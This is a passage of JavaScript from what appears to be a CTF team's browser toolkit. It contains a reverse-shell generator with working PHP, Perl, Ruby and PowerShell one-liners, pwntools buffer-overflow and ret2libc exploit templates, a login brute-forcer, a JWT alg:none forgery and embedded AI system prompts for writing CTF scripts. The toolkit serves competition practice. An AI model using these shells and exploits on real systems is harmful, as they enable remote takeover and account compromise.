  php:(ip,port)=>`php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  perl:(ip,port)=>`perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
  ruby:(ip,port)=>`ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
  powershell:(ip,port)=>`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
};
function genRevShell(){
  const ip=document.getElementById('rshellIp').value.trim();
  const port=document.getElementById('rshellPort').value.trim();
  const type=document.getElementById('rshellType').value;
  const out=document.getElementById('rshellResult');
  if(!ip||!port){out.textContent='Fill IP and port above';out.className='qt-result';return;}
  const fn=RSHELLS[type];
  if(fn){out.textContent=fn(ip,port);out.className='qt-result match';}
}

function runRegexGrep(){
  const pattern=document.getElementById('regexPattern').value.trim();
  const text=document.getElementById('regexText').value;
  const out=document.getElementById('regexResult');
  if(!pattern||!text){out.textContent='Enter pattern and text to search';out.className='qt-result';return;}
  try{
    const re=new RegExp(pattern,'g');
    const matches=[...text.matchAll(re)].map(m=>m[0]);
    if(!matches.length){out.textContent='No matches found';out.className='qt-result';return;}
    out.className='qt-result match';
    out.innerHTML=matches.map(m=>`<div style="display:flex;justify-content:space-between;align-items:center;padding:2px 0;border-bottom:1px solid var(--border);gap:.5rem;font-size:11px;"><span style="font-family:var(--mono);word-break:break-all;">${escHtml(m)}</span><button class="copy-btn" onclick="copyText(${JSON.stringify(m)},this)">Copy</button></div>`).join('');
  }catch(e){out.textContent='Invalid regex: '+e.message;out.className='qt-result';}
}

// â•â•â• TASK BOARD â•â•â•
let boardCards=[];
function loadBoard(){try{return JSON.parse(localStorage.getItem('ps-board')||'[]');}catch{return[];}}
function saveBoard(){try{localStorage.setItem('ps-board',JSON.stringify(boardCards));}catch{}}
function renderBoard(){
  boardCards=loadBoard();
  const statuses=['Untouched','Working','Stuck','Solved'];
  statuses.forEach(s=>{
    const col=document.getElementById('col-'+s);
    const count=document.getElementById('count-'+s);
    if(!col)return;
    const cards=boardCards.filter(c=>c.status===s);
    if(count)count.textContent=cards.length;
    col.innerHTML=cards.map((c,i)=>{
      const idx=boardCards.indexOf(c);
      return`<div class="board-card"><div class="board-card-name">${escHtml(c.name)}</div><div class="board-card-meta"><span class="board-cat-badge ${c.cat}">${c.cat}</span>${c.assignee?`<span class="board-assignee">${escHtml(c.assignee)}</span>`:''}<button class="board-status-btn" onclick="cycleStatus(${idx})">${escHtml(c.status)}</button></div>${c.flag?`<div class="board-flag-note" style="margin-top:4px;">Solved ${escHtml(c.flag)}</div>`:''}</div>`;
    }).join('');
  });
}
function cycleStatus(idx){
  const order=['Untouched','Working','Stuck','Solved'];
  const card=boardCards[idx];if(!card)return;
  const next=order[(order.indexOf(card.status)+1)%order.length];
  card.status=next;
  if(next==='Solved'&&!card.flag)card.flag=new Date().toLocaleString();
  saveBoard();renderBoard();if(typeof renderDashboard==='function')renderDashboard();
}
function openBoardModal(){document.getElementById('boardModal').style.display='flex';}
function closeBoardModal(){document.getElementById('boardModal').style.display='none';}
function saveBoardCard(){
  const name=document.getElementById('bm-name').value.trim();
  if(!name)return;
  boardCards=loadBoard();
  boardCards.push({name,cat:document.getElementById('bm-cat').value,assignee:document.getElementById('bm-assign').value,notes:document.getElementById('bm-notes').value,status:'Untouched',flag:'',created:new Date().toLocaleString()});
  saveBoard();renderBoard();closeBoardModal();if(typeof renderDashboard==='function')renderDashboard();
  document.getElementById('bm-name').value='';document.getElementById('bm-notes').value='';
}

// â•â•â• COMMAND EXPLAINER â•â•â•
let cmdExplainOpen=false;
function toggleCmdExplain(){
  cmdExplainOpen=!cmdExplainOpen;
  document.getElementById('cmdExplainPanel').classList.toggle('open',cmdExplainOpen);
  document.getElementById('cmdExplainBtn').classList.toggle('active',cmdExplainOpen);
  if(cmdExplainOpen)document.getElementById('cmdExplainInput').focus();
}
function clearCmdExplain(){document.getElementById('cmdExplainInput').value='';document.getElementById('cmdExplainOutput').className='cmd-explain-output';}
async function runCmdExplain(){
  const cmd=document.getElementById('cmdExplainInput').value.trim();
  const out=document.getElementById('cmdExplainOutput');
  if(!cmd)return;
  out.className='cmd-explain-output show';
  out.textContent='Analyzing command...';
  try{
    const resp=await fetch('https://api.anthropic.com/v1/messages',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({model:'claude-sonnet-4-6',max_tokens:1000,system:'You are a CTF command explainer for a team called Neutron PH. Explain commands like a senior CTF player: technical but clear, no fluff. For any command given:\n1. One sentence: what it does overall\n2. Each flag/option explained briefly (one line each)\n3. A real-world CTF usage example\n4. 1-2 related commands they might also need\nBe concise. No markdown headers, just plain text with clear structure.',messages:[{role:'user',content:`Explain this command: ${cmd}`}]})});
    if(!resp.ok)throw new Error(`API ${resp.status}: ${resp.statusText}. Make sure the API key is configured.`);
    const data=await resp.json();
    out.textContent=data.content.filter(i=>i.type==='text').map(i=>i.text).join('\n')||'No response received.';
  }catch(e){out.textContent='Error: '+e.message+'\n\nNote: The Command Explainer requires the Anthropic API. Make sure your API key is set up correctly.';}
}
document.addEventListener('keydown',e=>{if(e.key==='Enter'&&document.activeElement===document.getElementById('cmdExplainInput'))runCmdExplain();});

// â•â•â• THE HANDLER â•â•â•
let handlerFiles=[];
const hdrop=document.getElementById('helperDrop');
if(hdrop){['dragover','dragleave','drop'].forEach(ev=>hdrop.addEventListener(ev,e=>{e.preventDefault();if(ev==='dragover')hdrop.classList.add('dragover');else hdrop.classList.remove('dragover');if(ev==='drop')handleHelperFiles(e.dataTransfer.files);}));}
function setHelperPrompt(t){document.getElementById('helperPrompt').value=t;}
function handleHelperFiles(fl){for(const f of fl){if(f.size>5*1024*1024){alert(f.name+' exceeds 5MB limit');continue;}handlerFiles.push(f);}renderFileList();}
function removeFile(i){handlerFiles.splice(i,1);renderFileList();}
function renderFileList(){document.getElementById('helperFileList').innerHTML=handlerFiles.map((f,i)=>`<div class="helper-file-chip"><span>${escHtml(f.name)} (${(f.size/1024).toFixed(1)} KB)</span><button onclick="removeFile(${i})">&#215;</button></div>`).join('');}
function toB64(file){return new Promise((res,rej)=>{const r=new FileReader();r.onload=()=>res(r.result.split(',')[1]);r.onerror=rej;r.readAsDataURL(file);});}
function toText(file){return new Promise((res,rej)=>{const r=new FileReader();r.onload=()=>res(r.result);r.onerror=rej;r.readAsText(file);});}
const IMG_TYPES=['image/png','image/jpeg','image/gif','image/webp'];
async function runHandler(){
  const prompt=document.getElementById('helperPrompt').value.trim();
  const out=document.getElementById('helperOutput');
  const btn=document.getElementById('helperSubmit');
  if(!prompt&&!handlerFiles.length){out.className='helper-output visible';out.innerHTML='<div class="helper-error">Add a file or type a prompt first.</div>';return;}
  btn.disabled=true;out.className='helper-output visible';
  out.innerHTML='<div class="helper-loading"><div class="helper-spinner"></div>The Handler is analyzing...</div>';
  try{
    const blocks=[];
    for(const f of handlerFiles){if(IMG_TYPES.includes(f.type))blocks.push({type:'image',source:{type:'base64',media_type:f.type,data:await toB64(f)}});else if(f.type==='application/pdf')blocks.push({type:'document',source:{type:'base64',media_type:'application/pdf',data:await toB64(f)}});else{const t=await toText(f);blocks.push({type:'text',text:`File: ${f.name}\n${t.slice(0,50000)}`});}}
    blocks.push({type:'text',text:prompt||'Analyze for CTF flags, encodings, and suspicious patterns.'});
    const resp=await fetch('https://api.anthropic.com/v1/messages',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({model:'claude-sonnet-4-6',max_tokens:1000,system:'You are The Handler, a CTF analysis assistant for Team Neutron PH. Find flags (flag{...}, CTF{...}, picoCTF{...}), encodings, ciphers, steganography clues, and suspicious patterns. Be specific and methodical. Technical but clear.',messages:[{role:'user',content:blocks}]})});
    if(!resp.ok)throw new Error(`API ${resp.status}`);
    const data=await resp.json();
    out.textContent=data.content.filter(i=>i.type==='text').map(i=>i.text).join('\n')||'No response.';
  }catch(e){out.innerHTML=`<div class="helper-error">Error: ${escHtml(e.message)}</div>`;}
  finally{btn.disabled=false;}
}

// â•â•â• SCRIPT GENERATOR â•â•â•
let scriptLang='python';
function setLang(l){scriptLang=l;document.getElementById('langPython').classList.toggle('active',l==='python');document.getElementById('langJS').classList.toggle('active',l==='javascript');}
function setScriptPrompt(t){document.getElementById('scriptPrompt').value=t;}
async function runScriptGen(){
  const prompt=document.getElementById('scriptPrompt').value.trim();
  const out=document.getElementById('scriptOutput');
  const btn=document.getElementById('scriptSubmit');
  if(!prompt){out.className='helper-output visible';out.innerHTML='<div class="helper-error">Describe the script first.</div>';return;}
  btn.disabled=true;out.className='helper-output visible';
  out.innerHTML='<div class="helper-loading"><div class="helper-spinner"></div>Generating script...</div>';
  try{
    const resp=await fetch('https://api.anthropic.com/v1/messages',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({model:'claude-sonnet-4-6',max_tokens:1000,system:`You are a CTF scripting assistant for Team Neutron PH. Write a complete, ready-to-run ${scriptLang==='python'?'Python 3':'JavaScript'} script. Include brief comments. Use pwntools for Python pwn scripts. Output the code directly.`,messages:[{role:'user',content:prompt}]})});
    if(!resp.ok)throw new Error(`API ${resp.status}`);
    const data=await resp.json();
    out.textContent=data.content.filter(i=>i.type==='text').map(i=>i.text).join('\n')||'No response.';
  }catch(e){out.innerHTML=`<div class="helper-error">Error: ${escHtml(e.message)}</div>`;}
  finally{btn.disabled=false;}
}

// â•â•â• SCRIPT TEMPLATES â•â•â•
const TEMPLATES=[{title:"Pwn: Remote connect (pwntools)",category:"pwn",lang:"python",explanation:"Standard skeleton for connecting to a remote CTF service over TCP.",code:`from pwn import *
context.arch = 'amd64'
HOST = 'challenge.example.com'
PORT = 1337
conn = remote(HOST, PORT)
print(conn.recvuntil(b'> '))
conn.sendline(b'your_input_here')
response = conn.recvall(timeout=2)
print(response.decode(errors='ignore'))
conn.close()`},{title:"Pwn: Buffer overflow ret2win",category:"pwn",lang:"python",explanation:"Find offset with cyclic, overwrite return address to jump to win function.",code:`from pwn import *
context.arch = 'amd64'
elf = ELF('./vuln')
OFFSET = 72  # find with: cyclic 200, crash, then cyclic -l $rsp
win_addr = elf.symbols['win']
payload = b'A' * OFFSET + p64(win_addr)
conn = remote('challenge.example.com', 1337)
conn.recvuntil(b'> ')
conn.sendline(payload)
print(conn.recvall(timeout=2).decode(errors='ignore'))
conn.close()`},{title:"Pwn: ret2libc with leak",category:"pwn",lang:"python",explanation:"Leak a libc address, calculate base, then call system('/bin/sh').",code:`from pwn import *
context.arch = 'amd64'
elf = ELF('./vuln')
libc = ELF('./libc.so.6')
OFFSET = 72
conn = remote('challenge.example.com', 1337)
# Stage 1: leak puts address
payload = b'A' * OFFSET + p64(elf.plt['puts']) + p64(elf.symbols['main']) + p64(elf.got['puts'])
conn.recvuntil(b'> ')
conn.sendline(payload)
leaked = u64(conn.recvline().strip().ljust(8, b'\\x00'))
libc_base = leaked - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\\x00'))
# Stage 2: call system
payload2 = b'A' * OFFSET + p64(system_addr) + p64(0) + p64(binsh_addr)
conn.recvuntil(b'> ')
conn.sendline(payload2)
conn.interactive()`},{title:"Crypto: XOR brute force",category:"crypto",lang:"python",explanation:"Tries every single-byte XOR key and prints readable results.",code:`ciphertext_hex = '1c0a0e1b4f1a4116'
data = bytes.fromhex(ciphertext_hex)
for key in range(256):
    result = bytes(b ^ key for b in data)
    try:
        text = result.decode('ascii')
        printable = sum(c.isprintable() for c in text) / len(text)
        if printable > 0.85:
            print(f'key=0x{key:02x}: {text}')
    except UnicodeDecodeError:
        continue`},{title:"Crypto: RSA solve (small n)",category:"crypto",lang:"python",explanation:"Decrypts RSA when n can be factored. Use FactorDB for larger n.",code:`from sympy import factorint
n = 0  # paste n here
e = 65537
c = 0  # paste ciphertext as integer
factors = factorint(n)
print('Factors:', factors)
if len(factors) == 2:
    p, q = list(factors.keys())
    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)
    m = pow(c, d, n)
    flag_bytes = m.to_bytes((m.bit_length() + 7) // 8, 'big')
    print('Flag:', flag_bytes)`},{title:"Web: Login brute force",category:"web",lang:"python",explanation:"Sends a password list to a login form and detects success by response.",code:`import requests
url = 'http://challenge.example.com/login'
username = 'admin'
wordlist = ['password', '123456', 'admin', 'letmein']
for password in wordlist:
    resp = requests.post(url, data={'username': username, 'password': password})
    if 'Invalid' not in resp.text and resp.status_code == 200:
        print(f'Success: {password}')
        print(resp.text[:300])
        break
    else:
        print(f'Failed: {password}')`},{title:"Web: JWT alg:none attack",category:"web",lang:"python",explanation:"Removes JWT signature and sets algorithm to none to bypass verification.",code:`import jwt
token = 'YOUR_JWT_HERE'
decoded = jwt.decode(token, options={'verify_signature': False})
print('Original payload:', decoded)
decoded['role'] = 'admin'
forged = jwt.encode(decoded, key='', algorithm='none')
print('Forged token:', forged)`},{title:"Forensics: Extract strings for flags",category:"forensics",lang:"python",explanation:"Pure-Python strings grep for flag patterns in binary files.",code:`import re
filename = 'challenge_file'
with open(filename, 'rb') as f:
    data = f.read()
pattern = re.compile(rb'[\\x20-\\x7e]{4,}')
strings_found = pattern.findall(data)
flag_pattern = re.compile(rb'(flag|ctf|key)\\{.*?\\}', re.IGNORECASE)
for s in strings_found:
    if flag_pattern.search(s):
        print(s.decode(errors='ignore'))`},{title:"Misc: Multi-layer auto-decoder",category:"misc",lang:"python",explanation:"Repeatedly tries Base64, Hex, ROT13 until flag is found.",code:`import base64, codecs, re
def try_decode(s):
    try:
        d = base64.b64decode(s + '=' * (-len(s) % 4)).decode('ascii')
        if d.isprintable(): return ('base64', d)
    except: pass
    try:
        if re.fullmatch(r'[0-9a-fA-F]+', s) and len(s) % 2 == 0:
            d = bytes.fromhex(s).decode('ascii')
            if d.isprintable(): return ('hex', d)
    except: pass
    d = codecs.decode(s, 'rot_13')
    if d != s and re.search(r'flag\\{', d, re.IGNORECASE): return ('rot13', d)
    return (None, s)
current = 'PASTE_ENCODED_STRING_HERE'
for i in range(10):
    method, result = try_decode(current)
    if method is None: break
    print(f'Layer {i+1} ({method}): {result}')
    if re.search(r'(flag|ctf)\\{.*?\\}', result, re.IGNORECASE):
        print('FLAG FOUND'); break
    current = result`}];

function renderTemplates(cat){
  const list=document.getElementById('scriptTemplateList');if(!list)return;
  const items=cat==='all'?TEMPLATES:TEMPLATES.filter(t=>t.category===cat);
  list.innerHTML=items.map(t=>`<div class="script-card"><div class="script-card-head"><span class="script-card-title">${escHtml(t.title)}</span><span class="lang-badge lang-${t.lang}">${t.lang}</span></div><p class="script-card-explain">${escHtml(t.explanation)}</p><div class="script-code-wrap"><pre class="script-code">${escHtmlPre(t.code)}</pre><button class="script-copy-btn" onclick="copyText(TEMPLATES.find(x=>x.title===${JSON.stringify(t.title)}).code,this)">Copy</button></div></div>`).join('');
}
function filterTemplates(cat,btn){document.querySelectorAll('#scriptFilterBar .filter-btn').forEach(b=>b.classList.remove('active'));if(btn)btn.classList.add('active');renderTemplates(cat);}

// â•â•â• NOTES â•â•â•
function loadNotes(){try{return JSON.parse(localStorage.getItem('ps-notes')||'[]');}catch{return[];}}
function saveNotes(n){try{localStorage.setItem('ps-notes',JSON.stringify(n));}catch{}}
function renderNotes(){
  const notes=loadNotes();const list=document.getElementById('notesList');const count=document.getElementById('notesCount');if(!list)return;
  count.textContent=notes.length?`(${notes.length})`:'';
  if(!notes.length){list.innerHTML='<div class="notes-empty">No notes yet. Start writing.</div>';return;}
  list.innerHTML=notes.map((n,i)=>`<div class="note-card"><div class="note-card-head"><span class="note-card-title">${escHtml(n.title||'Untitled')}</span><span class="note-card-date">${n.date}</span><button class="note-card-del" onclick="delNote(${i})">&#215;</button></div><div class="note-card-body">${escHtml(n.body)}</div></div>`).join('');
}
function addNote(){const title=document.getElementById('noteTitle').value.trim()||'Untitled';const body=document.getElementById('noteBody').value.trim();if(!body)return;const notes=loadNotes();notes.unshift({title,body,date:new Date().toLocaleString()});saveNotes(notes);document.getElementById('noteTitle').value='';document.getElementById('noteBody').value='';renderNotes();if(typeof renderDashboard==='function')renderDashboard();}
function delNote(i){const notes=loadNotes();notes.splice(i,1);saveNotes(notes);renderNotes();if(typeof renderDashboard==='function')renderDashboard();}
function clearNotes(){if(confirm('Delete all notes?')){saveNotes([]);renderNotes();if(typeof renderDashboard==='function')renderDashboard();}}
let notesOpen=false;
function toggleNotes(){notesOpen=!notesOpen;document.getElementById('notesPanel').classList.toggle('open',notesOpen);document.getElementById('notesToggle').classList.toggle('active',notesOpen);if(notesOpen)renderNotes();}

// â•â•â• DORK BUILDER â•â•â•
const osintActive={};
function toggleOsintTag(tag){if(osintActive[tag]!==undefined)delete osintActive[tag];else osintActive[tag]='';renderOsintInputs();updateOsintQuery();updateOsintButtons();}
function renderOsintInputs(){const container=document.getElementById('osintInputs');if(!container)return;const tags=Object.keys(osintActive);if(!tags.length){container.innerHTML='<div class="osint-empty">Click an operator above to add a filter.</div>';return;}container.innerHTML=tags.map(tag=>`<div class="osint-input-row"><span class="osint-input-label">${tag}:</span><input type="text" class="osint-input" placeholder='Value for "${tag}"...' value="${escHtml(osintActive[tag])}" oninput="updateOsintVal('${tag}',this.value)" spellcheck="false"><button class="osint-remove-btn" onclick="removeOsintTag('${tag}')" title="Remove">&times;</button></div>`).join('');const inputs=container.querySelectorAll('.osint-input');if(inputs.length)inputs[inputs.length-1].focus();}
function updateOsintVal(tag,val){osintActive[tag]=val;updateOsintQuery();}
function removeOsintTag(tag){delete osintActive[tag];renderOsintInputs();updateOsintQuery();updateOsintButtons();}
function updateOsintQuery(){const el=document.getElementById('osintQuery');if(!el)return;const parts=[];for(const[tag,val]of Object.entries(osintActive)){if(val.trim())parts.push(`${tag}:"${val}"`);}if(!parts.length){el.innerHTML='<span class="osint-query-placeholder">Add a filter to build your query...</span>';}else{el.textContent=parts.join(' ');}}
function updateOsintButtons(){document.querySelectorAll('.osint-tag-btn').forEach(btn=>{const tag=btn.dataset.tag;btn.classList.toggle('active',osintActive[tag]!==undefined);});}
function copyOsintQuery(){const el=document.getElementById('osintQuery');if(!el)return;const text=el.textContent;if(!text||el.querySelector('.osint-query-placeholder'))return;navigator.clipboard.writeText(text).then(()=>{const btn=document.querySelector('.osint-copy-btn');if(!btn)return;const o=btn.textContent;btn.textContent='Copied!';setTimeout(()=>btn.textContent=o,1200);}).catch(()=>{});}
function clearOsintTags(){Object.keys(osintActive).forEach(k=>delete osintActive[k]);renderOsintInputs();updateOsintQuery();updateOsintButtons();}

const TOOLS_DATA = {"toolgrid-recon": [{"name": "Nmap", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "Network scanner and port mapper", "why": "Core recon tool used in almost every CTF involving networks", "tips": "Start with -sC -sV for default scripts and version detection. Use -p- to scan all 65535 ports on CTF boxes. Add -T4 to speed things up. Try --script vuln for quick vulnerability checks.", "link": "https://nmap.org"}, {"name": "Gobuster", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "Directory and file bruteforcer for web", "why": "Discovers hidden endpoints essential for web challenges", "tips": "Always use -x php,html,txt to catch common extensions. Use the SecLists directory-list-2.3-medium.txt wordlist as a default. Add -t 50 for faster threads. Use vhost mode to find virtual hosts.", "link": "https://github.com/OJ/gobuster"}, {"name": "Feroxbuster", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "Fast recursive content discovery tool", "why": "Blazing fast Rust-based alternative to Gobuster with recursion", "tips": "Use --depth 3 to control recursive depth. Add --filter-status 404 to reduce noise. Great for large web apps where Gobuster misses nested paths. Combine with -w raft-large-words.txt.", "link": "https://github.com/epi052/feroxbuster"}, {"name": "Shodan", "platform": "Web / API", "priority": "Must Master", "desc": "Internet-wide device search engine", "why": "Finds exposed services, banners, and vulnerabilities in OSINT CTFs", "tips": "Search by port: port:22, by org: org:TargetCorp, or by banner content. Use has_screenshot:true to find webcams. The Shodan CLI tool lets you automate queries in scripts.", "link": "https://www.shodan.io"}, {"name": "WHOIS / dig / nslookup", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "DNS and domain lookup utilities", "why": "Built-in tools needed for every DNS-related CTF challenge", "tips": "Use dig ANY domain.com to pull all DNS records at once. Try dig axfr @ns1.target.com target.com for zone transfer attempts. WHOIS reveals registrar info and sometimes real owner details.", "link": "https://linux.die.net/man/1/dig"}, {"name": "Google Dorks", "platform": "Web", "priority": "Must Master", "desc": "Advanced Google search operators for finding sensitive data", "why": "Uncovers sensitive files, configs, and login pages in OSINT challenges", "tips": "Key operators: site:, filetype:, intitle:, inurl:. Try filetype:pdf site:target.com or intitle:index.of password. The Exploit-DB Google Hacking Database has thousands of ready-made dorks.", "link": "https://www.exploit-db.com/google-hacking-database"}, {"name": "theHarvester", "platform": "Linux", "priority": "Important", "desc": "Email, domain, and IP OSINT aggregator", "why": "Quickly gathers external intel in OSINT challenges", "tips": "Run with multiple sources: -b google,bing,linkedin. Combine results with other tools. Good for finding employee emails that hint at username patterns used in CTF login challenges.", "link": "https://github.com/laramies/theHarvester"}, {"name": "Maltego", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Visual link-analysis OSINT platform", "why": "Maps relationships between entities in complex OSINT forensics CTFs", "tips": "Use community transforms to pivot from a domain to IPs to emails to social profiles. Best for challenges where you need to map out a whole organization or persona.", "link": "https://www.maltego.com"}, {"name": "Recon-ng", "platform": "Linux", "priority": "Important", "desc": "Modular web reconnaissance framework", "why": "Full-featured recon framework with plug-in ecosystem", "tips": "Think of it like Metasploit but for OSINT. Use marketplace install all to bulk install modules. workspaces create helps keep separate CTFs organized. Great for automating bulk domain intel.", "link": "https://github.com/lanmaster53/recon-ng"}, {"name": "Amass", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Subdomain enumeration and network mapping", "why": "Best-in-class subdomain discovery for web and OSINT challenges", "tips": "Use amass enum -passive -d target.com for passive recon first. Switch to -active when passive is exhausted. Combine with massdns to resolve found subdomains quickly.", "link": "https://github.com/owasp-amass/amass"}, {"name": "Wayback Machine", "platform": "Web / CLI", "priority": "Important", "desc": "Historical URL and page archive", "why": "Retrieves deleted pages and endpoints in OSINT and web challenges", "tips": "Use waybackurls tool: echo target.com | waybackurls to dump all archived URLs. Look for old admin panels, backup files (.bak, .old), and deprecated API endpoints that still work.", "link": "https://web.archive.org"}, {"name": "Censys", "platform": "Web / API", "priority": "Important", "desc": "Internet-wide certificate and port scanner", "why": "Alternative to Shodan great for SSL/TLS recon", "tips": "Use certificate search to find subdomains via SSL certs: certificates.subject_cn contains target.com. Often reveals internal or staging subdomains that do not appear in DNS.", "link": "https://search.censys.io"}, {"name": "SpiderFoot", "platform": "Linux / Win / Mac", "priority": "Useful", "desc": "Automated OSINT collection framework", "why": "Aggregates data from 200+ sources automatically", "tips": "Use the web UI for easier module selection. Best when you need a broad automated sweep rather than targeted manual recon. Point it at a domain and let it run while you work on other parts of the CTF.", "link": "https://github.com/smicallef/spiderfoot"}, {"name": "ExifTool", "platform": "Linux/Windows/Mac", "priority": "Must Master", "desc": "Reads, writes, and edits metadata in images, PDFs, and documents, GPS coordinates, camera info, authorship, timestamps.", "why": "Metadata leaks are one of the most common easy-flag sources in OSINT challenges.", "tips": "Run exiftool -a -G1 file for all tags grouped by category; check for GPS, Software, and Comment fields.", "link": "https://exiftool.org/"}, {"name": "Subfinder", "platform": "Linux/Win/Mac", "desc": "Fast passive subdomain enumeration using multiple sources including certificate transparency, DNS dumpster, and threat intelligence APIs.", "why": "Finds subdomains faster than Amass in passive mode; great first pass before active enumeration.", "tips": "subfinder -d target.com -o subs.txt. Combine with httpx to probe which ones are live: cat subs.txt | httpx -title -status-code.", "link": "https://github.com/projectdiscovery/subfinder"}, {"name": "httpx", "platform": "Linux", "desc": "Fast HTTP probing tool that checks which hosts are alive, grabs titles, status codes, and tech stack.", "why": "After subdomain enumeration, httpx quickly tells you what's actually responding and interesting.", "tips": "cat subs.txt | httpx -title -status-code -tech-detect -o results.txt. Use -mc 200 to filter live hosts only.", "link": "https://github.com/projectdiscovery/httpx"}, {"name": "Nuclei", "platform": "Linux/Win/Mac", "desc": "Template-based vulnerability scanner with 7000+ community templates covering CVEs, misconfigs, and exposures.", "why": "Run it against any web target to instantly check for hundreds of known vulnerabilities and misconfigs.", "tips": "nuclei -u http://target -t cves/ -t exposures/ -t misconfiguration/. Update templates daily: nuclei -update-templates.", "link": "https://github.com/projectdiscovery/nuclei"}, {"name": "Photon", "platform": "Linux/Python", "desc": "Fast web crawler that extracts URLs, emails, social media accounts, files, and secret keys from target sites.", "why": "Automates deep link discovery and extracts potential credentials and secrets from web pages.", "tips": "python3 photon.py -u http://target -l 3 -t 50 --keys. Check the exported results for API keys and tokens.", "link": "https://github.com/s0md3v/Photon"}, {"name": "WhatWeb", "platform": "Linux", "desc": "Web scanner that identifies technologies, CMS, frameworks, analytics, JavaScript libraries, and server info.", "why": "Faster than Wappalyzer for CLI use; identifies attack surface before exploitation.", "tips": "whatweb http://target --aggression 3 for full detection. -q for quiet mode. Outputs to JSON for automation.", "link": "https://github.com/urbanadventurer/WhatWeb"}, {"name": "Katana", "platform": "Linux", "desc": "Next-generation web crawler built for reconnaissance, discovers endpoints including JavaScript-rendered pages.", "why": "Finds endpoints missed by traditional crawlers by executing JavaScript and parsing SPA frameworks.", "tips": "katana -u http://target -jc -d 5 -o crawl.txt. Use -jc to enable JavaScript crawling for modern SPAs.", "link": "https://github.com/projectdiscovery/katana"}, {"name": "OWASP Amass", "platform": "Linux/Win/Mac", "desc": "In-depth attack surface mapping using DNS, scraping, certificates, and reverse DNS for comprehensive subdomain discovery.", "why": "Most thorough subdomain enumeration tool available; covers passive, active, and brute-force methods.", "tips": "amass enum -passive -d target.com first. Then amass enum -active -brute -d target.com for full coverage.", "link": "https://github.com/owasp-amass/amass"}, {"name": "EyeWitness", "platform": "Linux", "desc": "Takes screenshots of web applications, RDP, and VNC services; provides report with tech detection.", "why": "Visual recon across many hosts at once \u2014 spot login panels, default creds pages, and interesting apps fast.", "tips": "eyewitness --web -f urls.txt --timeout 30. Great for large scopes where you need visual overview quickly.", "link": "https://github.com/RedSiege/EyeWitness"}], "toolgrid-web": [{"name": "Burp Suite", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "Intercepting HTTP proxy and web testing platform", "why": "The number one web CTF tool covering proxy, repeater, scanner, and intruder", "tips": "Always set your browser to use Burp as a proxy first. Use Repeater to manually tweak requests. Intruder is great for brute-forcing login forms. Install extensions: Active Scan++, JWT Editor, Param Miner.", "link": "https://portswigger.net/burp"}, {"name": "SQLMap", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "Automated SQL injection and database takeover tool", "why": "Automates SQLi detection and exploitation saving hours of manual work", "tips": "Start with --dbs to enumerate databases, then -D db_name --tables, then -T table_name --dump. Use --level 5 --risk 3 for thorough scanning. Pass Burp-captured requests with -r request.txt for accuracy.", "link": "https://sqlmap.org"}, {"name": "ffuf", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "Fast web fuzzer for parameters, headers, and paths", "why": "Fast fuzzing for hidden params, auth bypass, and LFI", "tips": "The FUZZ keyword goes anywhere in the request. Fuzz directories, parameters, headers, even HTTP methods. Use -fc 404 to filter junk responses. Combine with -H for custom headers to bypass WAFs.", "link": "https://github.com/ffuf/ffuf"}, {"name": "curl", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "HTTP request crafting from the command line", "why": "Craft and replay arbitrary HTTP and API requests quickly", "tips": "Use -v for verbose output to see all headers. -d sends POST data. -b sets cookies. -H adds headers. Add --proxy http://127.0.0.1:8080 to pipe through Burp for inspection. Master this before Postman.", "link": "https://curl.se"}, {"name": "Burp Repeater", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "Manual HTTP request replaying inside Burp Suite", "why": "Precisely modify and resend requests to test injection points", "tips": "Right-click any request in Burp Proxy and Send to Repeater. Modify parameters one at a time to isolate vulnerabilities. Use Ctrl+Space for autocomplete on payload positions.", "link": "https://portswigger.net/burp/documentation/desktop/tools/repeater"}, {"name": "Gobuster", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "Directory and endpoint bruteforcer", "why": "Uncovers hidden directories, files, and virtual hosts", "tips": "Use dir mode for paths, vhost mode for virtual hosts, dns mode for subdomains. Always try common extensions: -x php,html,js,txt,bak. If a 302 redirect appears it usually means the path exists.", "link": "https://github.com/OJ/gobuster"}, {"name": "OWASP ZAP", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Open-source web application scanner", "why": "Free Burp alternative good for automated scanning in CTFs", "tips": "Use the Active Scan against logged-in sessions by setting up authentication in ZAP. The Ajax Spider handles JavaScript-heavy apps better than the standard spider. Good for quick automated discovery.", "link": "https://www.zaproxy.org"}, {"name": "Nikto", "platform": "Linux", "priority": "Important", "desc": "Web server vulnerability scanner", "why": "Quick scan for common misconfigurations and known CVEs", "tips": "Run with -h target.com -ssl for HTTPS targets. Not stealthy but great for quick wins. 